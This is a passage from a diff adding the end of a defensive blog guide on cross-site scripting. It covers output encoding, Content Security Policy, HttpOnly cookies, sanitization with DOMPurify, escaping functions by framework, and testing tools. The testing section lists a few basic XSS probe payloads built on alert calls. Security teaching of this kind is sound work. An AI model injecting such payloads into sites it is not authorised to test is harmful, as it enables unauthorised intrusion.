+// Django: {{ user_input }} auto-encodes
+// URL: encodeURIComponent(userInput)</code></pre>
+    <p class="ref"><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">OWASP XSS Prevention Cheat Sheet</a></p>
+
+    <h2 id="xss-e7">7. Protection: Content Security Policy</h2>
+    <pre><code>Content-Security-Policy:
+  default-src 'self';
+  script-src 'self' 'nonce-R4nd0m123';
+  object-src 'none';
+  base-uri 'self';</code></pre>
+    <p>Nonce-based: server generates random nonce per request. Only scripts with matching nonce execute.</p>
+    <p class="ref"><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank">MDN &mdash; CSP</a> | <a href="/blog-security-headers.html">Security headers guide</a></p>
+
+    <h2 id="xss-e8">8. Protection: HttpOnly cookies</h2>
+    <pre><code>Set-Cookie: session=abc; HttpOnly; Secure; SameSite=Strict;
+
+// Express.js
+app.use(session({ cookie: { httpOnly: true, secure: true, sameSite: 'strict' } }));
+
+// Django
+SESSION_COOKIE_HTTPONLY = True
+SESSION_COOKIE_SECURE = True</code></pre>
+
+    <h2 id="xss-e9">9. Protection: Input validation and sanitization</h2>
+    <pre><code>function validateUsername(input) {
+  return /^[a-zA-Z0-9_]{3,20}$/.test(input);
+}
+
+// DOMPurify
+import DOMPurify from 'dompurify';
+var clean = DOMPurify.sanitize(dirtyHTML, {
+  ALLOWED_TAGS: ['b', 'i', 'a', 'p'],
+  ALLOWED_ATTR: ['href']
+});</code></pre>
+    <table>
+      <tr><th>Framework</th><th>Auto-escaping</th><th>Dangerous functions</th></tr>
+      <tr><td>React</td><td>Yes (JSX)</td><td>Unsafe innerHTML wrapper</td></tr>
+      <tr><td>Angular</td><td>Yes</td><td>Bypass trust methods</td></tr>
+      <tr><td>Vue.js</td><td>Yes ({{ }})</td><td><code>v-html</code></td></tr>
+      <tr><td>Django</td><td>Yes</td><td><code>|safe</code>, <code>mark_safe()</code></td></tr>
+      <tr><td>Laravel</td><td>Yes ({{ }})</td><td><code>{!! !!}</code></td></tr>
+      <tr><td>ASP.NET Razor</td><td>Yes (@)</td><td><code>@Html.Raw()</code></td></tr>
+    </table>
+    <div class="callout callout-warn"><strong>Defense in Depth:</strong> Combine encoding + CSP + HttpOnly + validation + sanitization. No single mechanism is enough.</div>
+
+    <h2 id="xss-e10">10. Testing for XSS</h2>
+    <h3>Automated tools</h3>
+    <ul>
+      <li><strong>OWASP ZAP</strong> &mdash; Free, open-source proxy with XSS scanner</li>
+      <li><strong>Burp Suite</strong> &mdash; Professional XSS detection (Community edition free)</li>
+      <li><strong>XSS Hunter</strong> &mdash; Specialized for blind XSS</li>
+      <li><strong>Nuclei</strong> &mdash; Template-based scanner with XSS checks</li>
+    </ul>
+    <h3>Manual testing</h3>
+    <pre><code>&lt;!-- Basic test payloads --&gt;
+&lt;script&gt;alert('XSS')&lt;/script&gt;
+&lt;img src=x onerror=alert('XSS')&gt;
+&lt;svg onload=alert('XSS')&gt;
+
+&lt;!-- Test in: input fields, URL params, HTTP headers, cookies, file upload names --&gt;</code></pre>
+
+    <h2 id="xss-e11">11. References and resources</h2>
+    <ul>
+      <li><a href="https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html" target="_blank">OWASP XSS Prevention Cheat Sheet</a></li>
+      <li><a href="https://owasp.org/Top10/A07_2021-Cross-Site_Scripting_(XSS)/" target="_blank">OWASP Top 10 &mdash; A07:2021</a></li>
+      <li><a href="https://cwe.mitre.org/data/definitions/79.html" target="_blank">CWE-79</a></li>
+      <li><a href="https://portswigger.net/web-security/cross-site-scripting" target="_blank">PortSwigger &mdash; XSS Labs</a></li>
+      <li><a href="https://github.com/cure53/DOMPurify" target="_blank">DOMPurify</a></li>
+      <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-11022" target="_blank">CVE-2020-11022 &mdash; jQuery XSS</a></li>
+      <li><a href="https://nvd.nist.gov/vuln/detail/CVE-2021-41184" target="_blank">CVE-2021-41184 &mdash; jQuery UI</a></li>
+      <li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP" target="_blank">MDN &mdash; CSP</a></li>
+      <li><a href="https://owasp.org/www-community/xss-filter-evasion-cheatsheet" target="_blank">OWASP XSS Filter Evasion Cheat Sheet</a></li>
+    </ul>
+    <a href="./index.html" class="cta">Scan your site for XSS vulnerabilities &rarr;</a>
+  </div>
+
+  <div class="nav-links">
+    <a href="./blog-security-ssl.html"><span class="sr">SSL/TLS vodic</span><span class="en">SSL/TLS Guide</span></a>
+    <a href="./blog-security-headers.html"><span class="sr">HTTP Security Headers</span><span class="en">HTTP Security Headers</span></a>
+    <a href="./blog-security-sql.html"><span class="sr">SQL Injection</span><span class="en">SQL Injection</span></a>
+    <a href="./blog-security-csrf.html"><span class="sr">CSRF napadi</span><span class="en">CSRF Attacks</span></a>
+    <a href="./blog-security-dns.html"><span class="sr">DNS bezbednost</span><span class="en">DNS Security</span></a>
+    <a href="./blog-security-ports.html"><span class="sr">Port skeniranje</span><span class="en">Port Scanning</span></a>
+    <a href="./blog-security-api.html"><span class="sr">API bezbednost</span><span class="en">API Security</span></a>
+  </div>
+
+  </main>
+</div>
+<script src="./blog-common.js" defer></script>
+</body>
+</html>
